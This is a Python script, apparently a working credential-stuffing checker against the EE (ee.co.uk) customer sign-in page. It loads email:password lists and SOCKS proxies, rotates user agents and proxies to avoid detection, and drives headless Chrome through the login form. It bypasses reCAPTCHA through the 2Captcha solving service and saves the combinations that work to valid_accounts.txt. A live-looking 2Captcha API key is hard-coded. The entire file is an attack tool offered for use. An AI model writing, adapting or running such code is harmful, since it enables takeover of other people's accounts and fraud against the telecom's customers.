import threading
import random
import time
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from cfscrape_user_agents import user_agents

def read_accounts(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def read_proxies(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def get_random_user_agent():
    return random.choice(user_agents)

def get_random_proxy(proxies):
    return random.choice(proxies)

def create_driver(proxy, user_agent):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')  # Sometimes needed for headless mode
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-extensions')
    options.add_argument('--log-level=3')  # Suppress logs except for fatal
    options.add_argument('--enable-logging')
    options.add_argument('--v=1')  # Set verbosity level
    options.add_argument(f'user-agent={user_agent}')
    options.add_argument(f'--proxy-server={proxy}')

    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
        return driver
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        return None

def solve_captcha(api_key, site_key, url):
    # Send the captcha solving request to 2Captcha
    response = requests.post("http://2captcha.com/in.php", data={
        'key': api_key,
        'method': 'userrecaptcha',
        'googlekey': site_key,
        'pageurl': url,
        'json': 1
    })
    request_id = response.json().get('request')
    
    # Poll for the captcha solving result
    result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={request_id}&json=1"
    while True:
        result_response = requests.get(result_url)
        if result_response.json().get('status') == 1:
            return result_response.json().get('request')
        time.sleep(5)  # Wait for 5 seconds before polling again

def check_account(driver, email, password, valid_accounts_file, captcha_api_key, site_key):
    try:
        driver.get("https://auth.ee.co.uk/e2ea8fbf-98c0-4cf1-a2df-ee9d55ef69c3/b2c_1a_rpbt_signupsignin/oauth2/v2.0/authorize?client_id=af12d787-0a10-4f7a-b1c9-0b626d58770d&scope=openid%20offline_access%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.persn-id.id.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.persn-id.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.allowances-data.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.device-used.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.prepay-credit.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.packs.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.allowances-prepay.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.mble-sub.contract.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.nba-v2.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.interactions.write%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.online-contexts-v2.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.online-contexts-v2.write%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fidentity.billing-accounts.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fidentity.billing-accounts.all%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fidentity.profile.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fidentity.individual.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Ftmf.productinventry-v4.product.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital.blng-acnts.bills.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fdigital-v1.all%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fcustomer-bill-management-custbill.read%20https%3A%2F%2Fauth.ee.co.uk%2Fapi%2Fidentity.permissions.read%20profile&redirect_uri=https%3A%2F%2Fee.co.uk%2Fexp%2Fhome&client-request-id=34464720-646b-4fbb-b35d-3a2bf70b14da&response_mode=fragment&response_type=code&x-client-SKU=msal.js.browser&x-client-VER=2.32.0&client_info=1&code_challenge=bvFqLv0uz-rG2HoD8u14IsvkDdn0zK9ayktA5IaDMTk&code_challenge_method=S256&nonce=0c48a1d6-5ae6-473c-a1e3-68e5195f075e&state=eyJpZCI6IjFiMDMxOGFkLTM0ZWEtNGNhOC04NTlhLWQ2NjNhZDFmMmE0OSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D")
        
        wait = WebDriverWait(driver, 100)
        
        email_field = wait.until(EC.presence_of_element_located((By.ID, "signInName")))
        next_button = wait.until(EC.element_to_be_clickable((By.ID, "next")))

        email_field.send_keys(email)
        next_button.click()
        password_field = wait.until(EC.presence_of_element_located((By.ID, "password")))
        next_button = wait.until(EC.element_to_be_clickable((By.ID, "next")))
        password_field.send_keys(password)

        # Solve CAPTCHA using 2Captcha# Check for the presence of reCAPTCHA
        try:
            # captcha_element = driver.find_element(By.ID, "recaptcha-token")
            captcha_element = wait.until(EC.presence_of_element_located((By.ID, "recaptcha-token")))
            if captcha_element:
                print(f"CAPTCHA detected, solving...")
                captcha_token = solve_captcha(captcha_api_key, site_key, driver.current_url)
                
                # Inject the CAPTCHA token and submit the form
                driver.execute_script(f'document.getElementById("recaptcha-token").value="{captcha_token}";')
        except Exception as e:
            print(f"No CAPTCHA detected, proceeding...")
        
        next_button.click()
        success_indicator = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "lc-Heading")))
        if success_indicator:
            print(f"Valid: {email}:{password}")
            with open(valid_accounts_file, 'a') as f:
                f.write(f"email: {email} password: {password}\n")
            return True
        else:
            print(f"Invalid: {email}:{password}")
            return False
    except Exception as e:
        print(f"Error: {email}:{password} - {str(e)}")
        return False

def worker(accounts, proxies, valid_accounts_file, captcha_api_key, site_key):
    while accounts:
        email_password = accounts.pop()
        email, password = email_password.split(':')
        proxy = get_random_proxy(proxies)
        user_agent = get_random_user_agent()

        driver = create_driver(proxy, user_agent)
        check_account(driver, email, password, valid_accounts_file, captcha_api_key, site_key)
        driver.quit()

def main():
    accounts = read_accounts('accs.txt')
    proxies = read_proxies('socks.txt')
    valid_accounts_file = 'valid_accounts.txt'
    captcha_api_key = '26fd2db3fd163ae55752aa7ea3f7a4ed'
    site_key = '6LcJ63gjAAAAAOjck65X0CJ1TgRUbqQaL7jAOUrb'

    num_threads = 2
    threads = []

    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(accounts, proxies, valid_accounts_file, captcha_api_key, site_key))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
